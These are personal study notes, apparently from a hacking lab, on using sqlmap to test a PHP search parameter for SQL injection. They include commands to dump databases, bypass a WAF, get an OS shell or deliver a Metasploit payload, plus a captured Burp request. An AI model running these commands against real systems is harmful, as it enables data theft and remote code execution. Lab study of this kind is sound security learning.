# sqlmap

Author: Julien Bongars
Date: 2025-09-20 17:29:29
Path: /opt/development/cybersec/hacklas/notes/enumeration/sql/sqlmap.md

---

## Basic SQLMap Usage

Start with database detection:

```bash
bashsqlmap -u "http://10.129.228.235/dashboard.php?search=test" --dbs
```

If you need to specify the parameter:

```bash
bashsqlmap -u "http://10.129.228.235/dashboard.php" --data="search=test" --dbs
```

For GET parameter (your case):

```bash
bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --dbs
```

Common SQLMap Options
Get current database:

```bash
bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --current-db
```

List tables in a database:

```bash
bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" -D database_name --tables
```

Dump table contents:

```bash
bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" -D database_name -T table_name --dump
```

## Get OS shell:

```bash
bashsqlmap -u "http://10.129.228.235/dashboard.php?search=*" --os-shell
```

## Useful Flags

--batch - Don't ask for user input, use defaults
--level=5 - More thorough testing
--risk=3 - More aggressive payloads
--tamper=space2comment - Bypass WAF filters
--os-shell - start a reverse shell on the target server

## Request as curl

```bash
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 10.129.228.235' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Referer: http://10.129.228.235/dashboard.php' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' \
    -b $'PHPSESSID=m8ttqttc99dh4ehqggofmj35o4' \
    $'http://10.129.228.235/dashboard.php?search=fuzz'
```

### how to pipe this request to sqlmap? How does it work?

You can't directly pipe that curl command to SQLMap, but there are several ways to use it with SQLMap:

### Method 1: Save Request to File

```bash
# Save the request to a file
cat > request.txt << 'EOF'
GET /dashboard.php?search=fuzz HTTP/1.1
Host: 10.129.228.235
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.228.235/dashboard.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=m8ttqttc99dh4ehqggofmj35o4
EOF

# Use with SQLMap
sqlmap -r request.txt --dbs
```

### Method 2: Use SQLMap with Headers and Cookies

```bash
sqlmap -u "http://10.129.228.235/dashboard.php?search=*" \
  --cookie="PHPSESSID=m8ttqttc99dh4ehqggofmj35o4" \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" \
  --referer="http://10.129.228.235/dashboard.php" \
  --dbs
```

### Method 3: Capture with Burp/ZAP

Capture the request in Burp Suite
Right-click → "save item"

#### Save Item

```xml
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2024.9.5" exportTime="Sat Sep 20 13:33:01 CDT 2025">
  <item>
    <time>Sat Sep 20 13:20:00 CDT 2025</time>
    <url><![CDATA[http://10.129.228.235/dashboard.php?search=fuzz]]></url>
    <host ip="10.129.228.235">10.129.228.235</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[GET]]></method>
    <path><![CDATA[/dashboard.php?search=fuzz]]></path>
    <extension>php</extension>
    <request
      base64="true"
    ><![CDATA[R0VUIC9kYXNoYm9hcmQucGhwP3NlYXJjaD1mdXp6IEhUVFAvMS4xDQpIb3N0OiAxMC4xMjkuMjI4LjIzNQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuOQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMC4wLjY3MjMuNzAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClJlZmVyZXI6IGh0dHA6Ly8xMC4xMjkuMjI4LjIzNS9kYXNoYm9hcmQucGhwDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IFBIUFNFU1NJRD1tOHR0cXR0Yzk5ZGg0ZWhxZ2dvZm1qMzVvNA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
    <status>200</status>
    <responselength>1595</responselength>
    <mimetype>HTML</mimetype>
    <response
      base64="true"
    ><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBTYXQsIDIwIFNlcCAyMDI1IDE4OjIwOjAwIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjQxIChVYnVudHUpDQpFeHBpcmVzOiBUaHUsIDE5IE5vdiAxOTgxIDA4OjUyOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUNClByYWdtYTogbm8tY2FjaGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KQ29udGVudC1MZW5ndGg6IDEyNTYNCktlZXAtQWxpdmU6IHRpbWVvdXQ9NSwgbWF4PTEwMA0KQ29ubmVjdGlvbjogS2VlcC1BbGl2ZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgNCg0KPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+QWRtaW4gRGFzaGJvYXJkPC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4vZGFzaGJvYXJkLmNzcyI+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vdXNlLmZvbnRhd2Vzb21lLmNvbS8zM2EzNzM5NjM0LmpzIj48L3NjcmlwdD4KCjwvaGVhZD4KPGJvZHk+CjwhLS0gcGFydGlhbDppbmRleC5wYXJ0aWFsLmh0bWwgLS0+Cjxib2R5PgogPGRpdiBpZD0id3JhcHBlciI+CiA8ZGl2IGNsYXNzPSJwYXJlbnQiPgogIDxoMSBhbGlnbj0ibGVmdCI+TWVnYUNvcnAgQ2FyIENhdGFsb2d1ZTwvaDE+Cjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9IkdFVCI+CjxkaXYgY2xhc3M9InNlYXJjaC1ib3giPgogIDxpbnB1dCB0eXBlPSJzZWFyY2giIG5hbWU9InNlYXJjaCIgcGxhY2Vob2xkZXI9IlNlYXJjaCIgLz4KICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9InNlYXJjaC1idG4iPjxpIGNsYXNzPSJmYSBmYS1zZWFyY2giPjwvaT48L2J1dHRvbj4KPC9kaXY+CjwvZm9ybT4KICA8L2Rpdj4KICAKICA8dGFibGUgaWQ9ImtleXdvcmRzIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiPgogICAgPHRoZWFkPgogICAgICA8dHI+CiAgICAgICAgPHRoPjxzcGFuIHN0eWxlPSJjb2xvcjogd2hpdGUiPk5hbWU8L3NwYW4+PC90aD4KICAgICAgICA8dGg+PHNwYW4gc3R5bGU9ImNvbG9yOiB3aGl0ZSI+VHlwZTwvc3Bhbj48L3RoPgogICAgICAgIDx0aD48c3BhbiBzdHlsZT0iY29sb3I6IHdoaXRlIj5GdWVsPC9zcGFuPjwvdGg+CiAgICAgICAgPHRoPjxzcGFuIHN0eWxlPSJjb2xvcjogd2hpdGUiPkVuZ2luZTwvc3Bhbj48L3RoPgogICAgICA8L3RyPgogICAgPC90aGVhZD4KICAgIDx0Ym9keT4KCSAgICA8L3Rib2R5PgogIDwvdGFibGU+CiA8L2Rpdj4gCjwvYm9keT4KPCEtLSBwYXJ0aWFsIC0tPgogIDxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4xLjMvanF1ZXJ5Lm1pbi5qcyc+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qcXVlcnkudGFibGVzb3J0ZXIvMi4yOC4xNC9qcy9qcXVlcnkudGFibGVzb3J0ZXIubWluLmpzJz48L3NjcmlwdD48c2NyaXB0ICBzcmM9Ii4vZGFzaGJvYXJkLmpzIj48L3NjcmlwdD4KCjwvYm9keT4KPC9odG1sPgo=]]></response>
    <comment></comment>
  </item>
</items>
```

save base64 request as txt to request.txt

```bash
echo '<base64 from above>' | base64 -d | tee request.txt

# use sqlmap with request.txt
sqlmap -r request.txt

# get a reverse shell for target
sqlmap -r request.txt --os-shell

# use metasploit to deliver a payload a la sql injection
sqlmap -r request.txt --os-pwn

# haven't figured a way to get a reverse shell for now aside from direct SQL injection. See notes
```
